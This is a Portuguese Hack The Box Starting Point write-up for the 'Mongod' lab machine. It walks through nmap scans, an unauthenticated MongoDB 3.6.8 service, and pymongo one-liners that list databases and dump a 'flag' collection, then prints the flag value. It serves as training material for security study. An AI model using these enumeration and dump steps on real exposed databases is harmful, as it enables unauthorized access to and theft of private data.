# HTB - Starting Point - Mongod

🇺🇸 [English version](./README-mongod.md)

| Info        | Detalhe             |
|-------------|----------------------|
| Plataforma  | Hack The Box         |
| Track       | Starting Point       |
| Dificuldade | Muito Fácil          |
| OS          | Linux                |
| Status      | ✅ Resolvido          |

## Sumário
- [HTB - Starting Point - Mongod](#htb---starting-point---mongod)
  - [Sumário](#sumário)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lições aprendidas](#lições-aprendidas)

---

## Recon

Iniciei a máquina alvo pela plataforma do HTB, obtendo o endereço de IP do target:

**IP do alvo:** `10.129.228.30`

Em seguida, conectei na Pwnbox (máquina de ataque fornecida pelo HTB) e, através dela, me conectei na rede do target via VPN.

Rodei um scan com o **Nmap** com detecção de serviço/versão para identificar portas e serviços abertos no alvo:

```bash
nmap -sV 10.129.228.30
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```

Apenas o SSH apareceu no scan padrão das 1000 portas comuns. Como isso sozinho não oferecia um ponto de entrada claro, rodei um scan completo cobrindo todas as 65535 portas:

```bash
nmap -p- 10.129.228.30
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

Uma segunda porta, a **27017**, estava aberta fora do range comum — a porta padrão do **MongoDB**. Confirmei a versão com outro scan:

```bash
nmap -p- -sV 10.129.228.30
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
```

O alvo estava rodando **MongoDB 3.6.8**, uma versão antiga.

---

## Enumeration

Tentei conectar usando o shell legado `mongo`, mas ele não estava instalado:

```bash
mongo -h
```

```
bash: mongo: command not found
```

Tentei o cliente mais novo `mongosh`, mas também não estava disponível, então o instalei via apt:

```bash
sudo apt update && sudo apt install -y mongodb-mongosh
```

Após instalar, conectei ao alvo, especificando host e porta:

```bash
mongosh --host 10.129.228.30 --port 27017
```

```
MongoServerSelectionError: Server at 10.129.228.30:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 8 (MongoDB 4.2)
```

O `mongosh` exige MongoDB 4.2+ para conectar, mas o alvo estava rodando a muito mais antiga 3.6.8 — tornando esse cliente incompatível.

Tentei instalar vários pacotes de cliente legado (`mongodb-clients`, `mongodb-org-shell`, `mongodb-org-tools`), mas nenhum deles de fato forneceu o binário antigo `mongo` nesse sistema; os repositórios modernos do MongoDB descontinuaram esse binário em favor do `mongosh`.

Também tentei baixar o shell legado standalone do arquivo do MongoDB, mas a extração gerou uma pasta com nome diferente do esperado, então essa abordagem exigiria passos extras que não segui.

---

## Exploitation

Como nenhum shell compatível estava prontamente disponível, usei **Python com `pymongo`**, que lida com versões mais antigas do protocolo sem problemas:

```bash
pip3 install pymongo --break-system-packages
```

Listei todos os databases no servidor:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)
print(client.list_database_names())
"
```

```
['admin', 'config', 'local', 'sensitive_information', 'users']
```

Dois databases não-padrão se destacaram: `sensitive_information` e `users`. Listei as collections dentro de cada um:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)

db = client['sensitive_information']
print('Collections em sensitive_information:', db.list_collection_names())

db2 = client['users']
print('Collections em users:', db2.list_collection_names())
"
```

```
Collections em sensitive_information: ['flag']
Collections em users: ['ecommerceWebapp']
```

O database `sensitive_information` continha uma collection literalmente chamada `flag`. Despejei seus documentos:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)

db = client['sensitive_information']
for doc in db['flag'].find():
    print(doc)
"
```

```
{'_id': ObjectId('630e3dbcb82540ebbd1748c5'), 'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}
```

> **Nota:** Se um cliente shell compatível estivesse disponível, os comandos equivalentes dentro de uma sessão interativa seriam:
> ```
> show dbs
> use sensitive_information
> show collections
> db.flag.find()
> ```

---

## Flag

```
1b6e6fb359e7c40241b6d431427ba6ea
```

---

## Lições aprendidas

- O MongoDB, quando exposto sem autenticação, permite que qualquer pessoa que alcance a porta 27017 liste databases, collections e documentos livremente — uma falha crítica de configuração.
- Clientes shell modernos do MongoDB (`mongosh`) exigem MongoDB 4.2+ e se recusam a conectar em servidores mais antigos (incompatibilidade de wire version) — ao atacar versões legadas do MongoDB, é necessário um cliente compatível (shell `mongo` legado ou uma biblioteca driver como `pymongo`).
- O `pymongo` é um fallback flexível quando o shell nativo não está disponível ou compatível — ele consegue conectar, enumerar databases/collections e consultar documentos diretamente via Python.
- Sempre rode um scan completo de portas (`-p-`) quando um scan padrão retornar resultados limitados — serviços em portas não-padrão (como MongoDB na 27017) são fáceis de passar despercebidos de outra forma.
- Nomes de databases e collections podem ser fortes indicadores de dados valiosos — nomes como `sensitive_information` ou `flag` são sinais óbvios que valem a pena investigar primeiro.
